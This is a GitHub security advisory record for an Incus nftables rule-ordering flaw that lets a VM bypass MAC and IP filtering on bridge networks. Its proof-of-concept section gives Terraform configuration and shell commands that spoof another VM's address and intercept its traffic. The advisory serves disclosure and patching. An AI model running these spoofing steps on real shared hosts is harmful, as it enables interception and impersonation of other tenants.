{
	"cvss": {
		"score": 8.1,
		"vector_string": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:H"
	},
	"ghsa_id": "GHSA-p7fw-vjjm-2rwp",
	"summary": "Antispoofing nftables firewall rule bypass on bridge networks with ACLs",
	"description": "### Summary\r\n\r\nWhen using an ACL on a device connected to a bridge, Incus generates nftables rules that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge.\r\n\r\n### Details\r\n\r\nIn commit d137a063c2fe2a6983c995ba75c03731bee1557d, a few rules in the bridge input chain are moved to the top of the chain:\r\n\r\n    ct state established,related accept\r\n\r\n    iifname \"{{.hostName}}\" ether type arp accept\r\n    iifname \"{{.hostName}}\" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept\r\n\r\nHowever, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\", \"IPv4 filtering\" and \"IPv6 filtering\" snippets:\r\n\r\n\tiifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\r\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\r\n    ...\r\n    iifname \"{{.hostName}}\" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop\r\n    ...\r\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop\r\n\r\nBasically, the added rules partially bypass the security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. Doing so, they allow an attacker to perform ARP poisoning/spoofing attacks and send malicious Neighbor Advertisement (type 136).\r\n\r\n### PoC\r\n\r\nWith this terraform infrastructure:\r\n\r\n```\r\nresource \"incus_network_acl\" \"acl_allow_out\" {\r\n  name    = \"acl-allow-out\"\r\n  egress = [\r\n    {\r\n      action           = \"allow\"\r\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\r\n      state            = \"enabled\"\r\n    },\r\n  ]\r\n}\r\nresource \"incus_network_acl\" \"acl_allow_in\" {\r\n  name    = \"acl-allow-in\"\r\n  ingress = [\r\n    {\r\n      action           = \"allow\"\r\n      state            = \"enabled\"\r\n    },\r\n  ]\r\n}\r\n\r\nresource \"incus_network\" \"br0\" {\r\n  name = \"br0\"\r\n  config = {\r\n    \"ipv4.address\"          = \"10.0.0.1/24\"\r\n    \"ipv4.nat\"              = \"true\"\r\n  }\r\n}\r\n\r\nresource \"incus_instance\" \"machine1\" {\r\n  name  = \"machine1\"\r\n  image = \"images:archlinux/cloud\"\r\n  type = \"virtual-machine\"\r\n  config = {\r\n    \"limits.memory\" = \"2GiB\"\r\n    \"security.secureboot\" = false\r\n    \"boot.autostart\" = false\r\n    \"cloud-init.vendor-data\" = \u003c\u003c-EOF\r\n      #cloud-config\r\n      package_update: true\r\n      packages:\r\n        - dhclient\r\n        - tcpdump\r\n      runcmd:\r\n        - systemctl disable --now systemd.networkd.service\r\n        - systemctl disable --now systemd.networkd.socket\r\n    EOF\r\n  }\r\n  device {\r\n    type = \"disk\"\r\n    name = \"root\"\r\n    properties = {\r\n      pool = \"default\"\r\n      path = \"/\"\r\n      size = \"64GiB\"\r\n    }\r\n  }\r\n  device {\r\n    type = \"nic\"\r\n    name = \"eth0\"\r\n    properties = {\r\n      network = incus_network.br0.name\r\n      \"security.ipv4_filtering\" = true\r\n      \"security.acls\" = join(\",\",\r\n        [\r\n          incus_network_acl.acl_allow_out.name,\r\n          incus_network_acl.acl_allow_in.name,\r\n        ])\r\n    }\r\n  }\r\n}\r\n\r\nresource \"incus_instance\" \"machine2\" {\r\n  name  = \"machine2\"\r\n  image = \"images:archlinux/cloud\"\r\n  type = \"virtual-machine\"\r\n  config = {\r\n    \"limits.memory\" = \"2GiB\"\r\n    \"security.secureboot\" = false\r\n    \"boot.autostart\" = false\r\n  }\r\n  device {\r\n    type = \"disk\"\r\n    name = \"root\"\r\n    properties = {\r\n      pool = \"default\"\r\n      path = \"/\"\r\n      size = \"64GiB\"\r\n    }\r\n  }\r\n  device {\r\n    type = \"nic\"\r\n    name = \"eth0\"\r\n    properties = {\r\n      network = incus_network.br0.name\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nAn attacker in a VM (machine1) change their IP address to another VM (machine2)'s IP. The malicious change is reflected in the ARP table of the host, bypassing the MAC filtering. When the host emits or forwards a packet to machine2's IP, it is sent to machine1.\r\nIn addition, as `ct state established,related accept` is now the first rule in bridge chain input, machine1 can even answer and thus fully spoof the victim on the network.\r\n\r\n```bash\r\n[HOST]$ ip n\r\n10.0.0.236 dev br0 lladdr 10:66:6a:88:e6:5b REACHABLE # machine2\r\n10.0.0.2 dev br0 lladdr 10:66:6a:89:39:45 REACHABLE # machine1\r\n\r\n# Spoof machine2\r\n[MACHINE1]$ ip add del 10.0.0.2/24 dev enp5s0\r\n[MACHINE1]$ ip add add 10.0.0.236/24 dev enp5s0\r\n\r\n# Flood\r\n[MACHINE1]$ arping 10.0.0.1\r\n\r\n# Machine2's IP refers to machine1's MAC in host ARP table\r\n[HOST]$ ip n\r\n10.0.0.236 dev br0 lladdr 10:66:6a:89:39:45 STALE\r\n\r\n# Packets from the host (or forwarded by the host) to machine2 ...\r\n[HOST]$ ping 10.0.0.236\r\nPING 10.0.0.236 (10.0.0.236) 56(84) bytes of data.\r\n64 bytes from 10.0.0.236: icmp_seq=1 ttl=64 time=1.19 ms\r\n\r\n# ... are sent to machine1!\r\n[MACHINE1]$ tcpdump -nei enp5s0\r\nlistening on enp5s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\r\n15:15:17.008470 10:66:6a:99:e0:d8 \u003e 10:66:6a:89:39:45, ethertype IPv4 (0x0800), length 98: 10.0.0.1 \u003e 10.0.0.236: ICMP echo request, id 4, seq 1, length 64\r\n15:15:17.008513 10:66:6a:89:39:45 \u003e 10:66:6a:99:e0:d8, ethertype IPv4 (0x0800), length 98: 10.0.0.236 \u003e 10.0.0.1: ICMP echo reply, id 4, seq 1, length 64\r\n```\r\n\r\n### Impact\r\n\r\nAll versions since d137a063c2fe2a6983c995ba75c03731bee1557d, so basically v6.12 and v6.13.\r\n",
	"severity": "high",
	"identifiers": [
		{
			"value": "GHSA-p7fw-vjjm-2rwp",
			"type": "GHSA"
		},
		{
			"value": "CVE-2025-52890",
			"type": "CVE"
		}
	],
	"published_at": "2025-06-25T14:13:03Z",
	"updated_at": "2025-06-26T11:02:34Z",
	"vulnerabilities": [
		{
			"package": {
				"ecosystem": "go",
				"name": "github.com/lxc/incus/v6/cmd/incusd"
			},
			"vulnerable_version_range": "6.12, 6.13",
			"patched_versions": ""
		}
	],
	"cve_id": "CVE-2025-52890",
	"url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-p7fw-vjjm-2rwp",
	"html_url": "https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp",
	"publisher": {
		"login": "stgraber",
		"id": 2230599,
		"node_id": "MDQ6VXNlcjIyMzA1OTk=",
		"avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
		"html_url": "https://github.com/stgraber",
		"gravatar_id": "",
		"type": "User",
		"site_admin": false,
		"url": "https://api.github.com/users/stgraber",
		"events_url": "https://api.github.com/users/stgraber/events{/privacy}",
		"following_url": "https://api.github.com/users/stgraber/following{/other_user}",
		"followers_url": "https://api.github.com/users/stgraber/followers",
		"gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
		"organizations_url": "https://api.github.com/users/stgraber/orgs",
		"received_events_url": "https://api.github.com/users/stgraber/received_events",
		"repos_url": "https://api.github.com/users/stgraber/repos",
		"starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
		"subscriptions_url": "https://api.github.com/users/stgraber/subscriptions"
	},
	"state": "published",
	"credits": [
		{
			"login": "obp-anssi",
			"type": "reporter"
		}
	],
	"credits_detailed": [
		{
			"user": {
				"login": "obp-anssi",
				"id": 95420851,
				"node_id": "U_kgDOBbABsw",
				"avatar_url": "https://avatars.githubusercontent.com/u/95420851?v=4",
				"html_url": "https://github.com/obp-anssi",
				"gravatar_id": "",
				"type": "User",
				"site_admin": false,
				"url": "https://api.github.com/users/obp-anssi",
				"events_url": "https://api.github.com/users/obp-anssi/events{/privacy}",
				"following_url": "https://api.github.com/users/obp-anssi/following{/other_user}",
				"followers_url": "https://api.github.com/users/obp-anssi/followers",
				"gists_url": "https://api.github.com/users/obp-anssi/gists{/gist_id}",
				"organizations_url": "https://api.github.com/users/obp-anssi/orgs",
				"received_events_url": "https://api.github.com/users/obp-anssi/received_events",
				"repos_url": "https://api.github.com/users/obp-anssi/repos",
				"starred_url": "https://api.github.com/users/obp-anssi/starred{/owner}{/repo}",
				"subscriptions_url": "https://api.github.com/users/obp-anssi/subscriptions"
			},
			"type": "reporter",
			"state": "accepted"
		}
	]
}